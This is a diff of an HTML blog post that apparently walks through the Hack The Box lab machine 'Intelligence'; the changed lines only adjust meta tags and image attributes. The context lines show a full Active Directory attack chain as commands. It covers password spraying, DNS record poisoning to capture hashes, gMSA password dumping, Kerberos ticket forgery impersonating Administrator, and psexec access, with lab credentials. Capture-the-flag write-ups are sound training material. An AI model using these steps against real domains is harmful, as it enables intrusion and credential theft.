@@ -13,13 +13,14 @@
   <meta property="og:description" content="Intelligence was an medium-level box that showcased realistic AD-attacks.">
   <meta property="og:type" content="article">
   <meta property="og:url" content="https://0xma1ware.github.io/posts/intelligence.html">
-  <meta property="og:image" content="https://0xma1ware.github.io/favicon.ico">
+  <meta property="og:image" content="https://0xma1ware.github.io/imgs/assets-intelligence/port80.png">
   <meta property="article:published_time" content="2023-07-26">
   <meta property="article:author" content="ma1ware">
-  <meta name="twitter:card" content="summary">
+  <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:site" content="@0xma1ware">
   <meta name="twitter:title" content="HTB - Intelligence">
   <meta name="twitter:description" content="Intelligence was an medium-level box that showcased realistic AD-attacks.">
+  <meta name="twitter:image" content="https://0xma1ware.github.io/imgs/assets-intelligence/port80.png">
   <link rel="icon" href="../favicon.ico">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -38,7 +39,7 @@
 </head>
 <body>
   <header class="site-header">
-    <a href="../" class="site-logo"><img src="../favicon.ico" alt="logo"><span class="prefix">0x</span>ma1ware<span class="cursor-blink"></span></a>
+    <a href="../" class="site-logo"><img src="../favicon.ico" alt="logo" width="32" height="32"><span class="prefix">0x</span>ma1ware<span class="cursor-blink"></span></a>
     <button class="menu-toggle" aria-label="Menu" onclick="document.querySelector('.site-nav').classList.toggle('open')">
       <span></span><span></span><span></span>
     </button>
@@ -161,9 +162,9 @@ Service<span style="color: #F8F8F2"> </span>detection<span style="color: #F8F8F2
 
 <hr />
 <h2 id="port-80-http-iis">Port 80 - HTTP (IIS)</h2>
-<p><img alt="&quot;Port 80&quot;" src="../imgs/assets-intelligence/port80.png" /></p>
+<p><img alt="Port 80" src="../imgs/assets-intelligence/port80.png"  loading="lazy"/></p>
 <p>Downloading the two PDFs we get two usernames:<br />
-<img alt="&quot;Exiftool output&quot;" src="../imgs/assets-intelligence/exiftool.png" /></p>
+<img alt="Exiftool output" src="../imgs/assets-intelligence/exiftool.png"  loading="lazy"/></p>
 <ul>
 <li>William.Lee</li>
 <li>Jose.Williams</li>
@@ -215,7 +216,7 @@ generate_date_patterns
 </code></pre></div>
 
 <p>We can open up this pdf using <code>okular</code> or any other pdf reader:</p>
-<p><img alt="&quot;Default Credentials&quot;" src="../imgs/assets-intelligence/defaultpass-pdf.png" /></p>
+<p><img alt="Default Credentials" src="../imgs/assets-intelligence/defaultpass-pdf.png"  loading="lazy"/></p>
 <p>Default credentials: <code>NewIntelligenceCorpUser9876</code></p>
 <p>Now that we have a default password we should also construct a list of usernames since we only have two at this point:</p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>$<span style="color: #F8F8F2"> </span>exiftool<span style="color: #F8F8F2"> </span>*<span style="color: #F8F8F2"> | </span>grep<span style="color: #F8F8F2"> </span>-i<span style="color: #F8F8F2"> </span>Creator<span style="color: #F8F8F2"> | </span>sort<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> | </span>uniq<span style="color: #F8F8F2"> | </span>cut<span style="color: #F8F8F2"> </span>-f<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2"> </span>-d<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;:&quot;</span><span style="color: #F8F8F2"> | </span>tee<span style="color: #F8F8F2"> </span>../usernames
@@ -254,11 +255,11 @@ generate_date_patterns
 <p>You can remove the space before using vim magic, but I don't think it actually changes anything.</p>
 <hr />
 <p>Password spraying smb returns a hit:<br />
-<img alt="&quot;Password Spraying with CrackMapExec&quot;" src="../imgs/assets-intelligence/cme-spray.png" /></p>
+<img alt="Password Spraying with CrackMapExec" src="../imgs/assets-intelligence/cme-spray.png"  loading="lazy"/></p>
 <p><code>intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876</code></p>
 <p>Tiffany really should stop using the default password!</p>
 <p>Shares that she can access are:<br />
-<img alt="&quot;Listing shares using CrackMapExec&quot;" src="../imgs/assets-intelligence/cme-shares.png" /></p>
+<img alt="Listing shares using CrackMapExec" src="../imgs/assets-intelligence/cme-shares.png"  loading="lazy"/></p>
 <p>We find a <code>downdetector.ps1</code> inside the IT share</p>
 <p>We also find the user.txt in the Users share that we can submit later on</p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #959077"># Check web server status. Scheduled to run every 5min</span>
@@ -279,16 +280,16 @@ generate_date_patterns
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>python3<span style="color: #F8F8F2"> </span>DNSUpdate.py<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;intelligence\Tiffany.Molina&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;NewIntelligenceCorpUser9876&#39;</span><span style="color: #F8F8F2"> </span>-a<span style="color: #F8F8F2"> </span>ad<span style="color: #F8F8F2"> </span>-r<span style="color: #F8F8F2"> </span>webma1ware<span style="color: #F8F8F2"> </span>-d<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.10.16.22<span style="color: #F8F8F2"> </span>-DNS<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.156.112
 </code></pre></div>
 
-<p><img alt="&quot;Updating DNS entry&quot;" src="../imgs/assets-intelligence/dnsupdate.png" /></p>
+<p><img alt="Updating DNS entry" src="../imgs/assets-intelligence/dnsupdate.png"  loading="lazy"/></p>
 <p>Boom! We get a hash:<br />
-<img alt="&quot;Responder&quot;" src="../imgs/assets-intelligence/responder-hash.png" /></p>
+<img alt="Responder" src="../imgs/assets-intelligence/responder-hash.png"  loading="lazy"/></p>
 <p>Cracking it returns:<br />
-<img alt="&quot;Cracking with JTR&quot;" src="../imgs/assets-intelligence/john-hash.png" /></p>
+<img alt="Cracking with JTR" src="../imgs/assets-intelligence/john-hash.png"  loading="lazy"/></p>
 <p><code>Ted.Graves:Mr.Teddy</code></p>
 <p>Checking in bloohound we can read the password of <code>SVC_INT</code>:<br />
-<img alt="&quot;Reading password&quot;" src="../imgs/assets-intelligence/readpass-bloodhound.png" /></p>
+<img alt="Reading password" src="../imgs/assets-intelligence/readpass-bloodhound.png"  loading="lazy"/></p>
 <p>Bloodhound recommands we use: https://github.com/micahvandeusen/gMSADumper</p>
-<p><img alt="&quot;Dumping password&quot;" src="../imgs/assets-intelligence/password-dumper.png" /></p>
+<p><img alt="Dumping password" src="../imgs/assets-intelligence/password-dumper.png"  loading="lazy"/></p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>ma1ware@shadow:~/pentest/htb/boxes/Intelligence/gMSADumper$<span style="color: #F8F8F2"> </span>python3<span style="color: #F8F8F2"> </span>gMSADumper.py<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;Ted.Graves&#39;</span><span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;Mr.Teddy&#39;</span><span style="color: #F8F8F2"> </span>-d<span style="color: #F8F8F2"> </span>intelligence.htb
 Users<span style="color: #F8F8F2"> </span>or<span style="color: #F8F8F2"> </span>groups<span style="color: #F8F8F2"> </span>who<span style="color: #F8F8F2"> </span>can<span style="color: #F8F8F2"> read </span>password<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span>svc_int$:
 <span style="color: #F8F8F2"> </span>&gt;<span style="color: #F8F8F2"> </span>DC$
@@ -300,7 +301,7 @@ svc_int$:aes128-cts-hmac-sha1-96:de0b7110639ccbcd2cf195840d6b3ca7
 
 <p>I tried to crack the hash but that failed, so since this is a service account we can create a silver ticket<br />
 since this user has <code>AllowedToDelegate</code> on the DC:<br />
-<img alt="&quot;AllowedToDelegate&quot;" src="../imgs/assets-intelligence/AllowedToDelegate.png" /></p>
+<img alt="AllowedToDelegate" src="../imgs/assets-intelligence/AllowedToDelegate.png"  loading="lazy"/></p>
 <p>To get the SPN we can access Node properties of svc_int user in Bloodhound</p>
 <p>Before we carry out the exploit we should sync our time with the DC:</p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>$<span style="color: #F8F8F2"> </span>sudo<span style="color: #F8F8F2"> </span>rdate<span style="color: #F8F8F2"> </span>-n<span style="color: #F8F8F2"> </span>&lt;ip<span style="color: #F8F8F2"> </span>of<span style="color: #F8F8F2"> </span>DC&gt;
@@ -309,12 +310,12 @@ since this user has <code>AllowedToDelegate</code> on the DC:<br />
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>impacket-getST<span style="color: #F8F8F2"> </span>-spn<span style="color: #F8F8F2"> </span>www/dc.intelligence.htb<span style="color: #F8F8F2"> </span>-dc-ip<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.156.112<span style="color: #F8F8F2"> </span>-impersonate<span style="color: #F8F8F2"> </span>Administrator<span style="color: #F8F8F2"> </span>intelligence.htb/svc_int<span style="color: #F8F8F2"> </span>-hashes<span style="color: #F8F8F2"> </span>:fb49fcd5ffc6fefa70503e08c9cd8261
 </code></pre></div>
 
-<p><img alt="&quot;Creating a silver ticket&quot;" src="../imgs/assets-intelligence/silver-ticket.png" /></p>
+<p><img alt="Creating a silver ticket" src="../imgs/assets-intelligence/silver-ticket.png"  loading="lazy"/></p>
 <p>Then we use the ticket with psexec.py</p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>$<span style="color: #F8F8F2"> KRB5CCNAME</span><span style="color: #FF4689">=</span>Administrator.ccache<span style="color: #F8F8F2"> </span>impacket-psexec<span style="color: #F8F8F2"> </span>-k<span style="color: #F8F8F2"> </span>-no-pass<span style="color: #F8F8F2"> </span>administrator@intelligence.htb
 </code></pre></div>
 
-<p><img alt="&quot;PsExec with Kerberos Auth&quot;" src="../imgs/assets-intelligence/psexec-root.png" /></p>
+<p><img alt="PsExec with Kerberos Auth" src="../imgs/assets-intelligence/psexec-root.png"  loading="lazy"/></p>
 <p>And with that the box is finished!</p>
 <hr />
   </article>
